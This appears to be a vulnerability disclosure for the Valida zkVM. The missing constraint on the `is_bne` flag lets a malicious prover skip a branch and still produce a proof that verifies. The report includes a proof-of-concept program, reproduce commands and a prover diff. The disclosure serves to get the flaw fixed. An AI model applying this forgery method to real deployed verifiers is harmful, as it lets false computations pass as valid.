The AIR for the CPU chip does not enforce that `opcode_flags.is_bne` must match `instruction.opcode == BNE`. Consequently, a malicious prover can flip `is_bne` from 1 to 0 even when executing a BNE, causing the `next.pc` logic to fall back to `local.pc + 1` even if the branch condition is met, yielding invalid traces that can still pass the verification.

See also #13.

## PoC

The concrete PoC is available at https://github.com/Koukyosyumei/valida-vm/tree/hideaki-poc-7:

Reproduce steps:

```bash
cd basic-api
cargo test prove_bne --release
```

Specifically, this Poc considers the following program:

```rust
fn bne_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let bytes_per_instr = BYTES_PER_INSTR as i32;

    let mut program = vec![];
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}
```

The expected transition of `pc` is `0 → 1 → 2 → 1 → 2 → 3`.

However, consider the following modification of `cpu/src/lib.rs`.

```rust

                self.set_imm_value(cols, *imm);
            }
            Operation::Bne(imm) => {
+                //cols.opcode_flags.is_bne = SC::Val::one();
                self.set_imm_value(cols, *imm);
            }
            Operation::Imm32 => {
	@@ -1098,11 +1098,11 @@ where
        if state.machine.log_enabled() {
            state.machine.push_op(Operation::Bne(imm), opcode, ops);
        }
+      //if cell_1 != cell_2 {
+      //    state.machine.set_pc((ops.a() as u32) / BYTES_PER_INSTR);
+      //} else {
        state.machine.step_pc();
+      //}
    }
}
```

This modification produces the malicious transition of `pc`: `0 → 1 → 2 → 3`, while the resulting proof can still pass all verifications.
